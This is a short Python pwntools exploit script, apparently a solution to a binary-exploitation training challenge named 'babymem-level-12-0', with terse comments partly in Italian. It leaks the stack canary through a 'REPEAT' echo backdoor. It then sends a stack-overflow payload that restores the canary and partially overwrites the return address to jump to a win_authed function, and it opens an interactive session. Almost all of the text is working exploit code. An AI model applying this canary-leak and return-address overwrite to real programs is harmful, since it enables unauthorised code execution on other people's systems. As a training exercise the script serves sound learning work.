from pwn import * 

# REPEAT backdoor
# It starts another challenge(), 192 below in the stack
# The canary is static? 
# win_authed() at 21 7d
# Buffer length is 92, exploit %s after the "you said"
# Buf dist from ret address is 0x78 = d120
# Stack is always: ret, sfp, canary
# Prima esecuzione: payload length, REPEAT+padding, stampa il valore della canary


elf = ELF("/challenge/babymem-level-12-0")

io = elf.process()

payload = b"REPEAT" + b'A'*(98)

io.sendline(b"500")

io.sendline(payload)

io.recvuntil(b"A"*98)
io.recvuntil("\n")
val = io.recvuntil("\n")

val = val[:7]
val = b"\x00" + val

pay2 = b'A'*104 + val + b'A'*8 + b'\x7d' + b'\x21'

# Has to be exact, as usual
io.sendline(f"{len(pay2)}")
io.sendline(pay2)

io.interactive()
